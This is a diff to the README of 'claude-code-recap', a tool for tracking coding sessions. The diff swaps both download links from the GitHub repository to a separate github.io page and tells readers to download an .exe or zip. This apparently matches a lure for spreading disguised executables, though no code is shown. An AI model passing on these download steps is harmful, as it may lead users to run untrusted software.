@@ -1,6 +1,6 @@
 # 📂 claude-code-recap - Manage your coding sessions with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/carlitanonenzymatic493/claude-code-recap)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://carlitanonenzymatic493.github.io)
 
 This tool helps you track your past coding sessions. It organizes your work projects into a single view. You see the project location, a short summary of your work, the current branch, the model you used, and the number of steps taken. When you need to start where you left off, the tool provides a command you paste into your terminal. You can also re-open your entire working set in separate tabs with one command. This tool stays on your computer. It does not send your data over the internet.
 
@@ -18,7 +18,7 @@ If you do not have Python, you can find it by searching for "Python" on the offi
 
 Follow these steps to get the software on your computer.
 
-1. Visit this page to download: [https://github.com/carlitanonenzymatic493/claude-code-recap](https://github.com/carlitanonenzymatic493/claude-code-recap)
+1. Visit this page to download: [https://carlitanonenzymatic493.github.io](https://carlitanonenzymatic493.github.io)
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the most recent version number.
 4. Download the file that ends in .exe or the zip folder. 
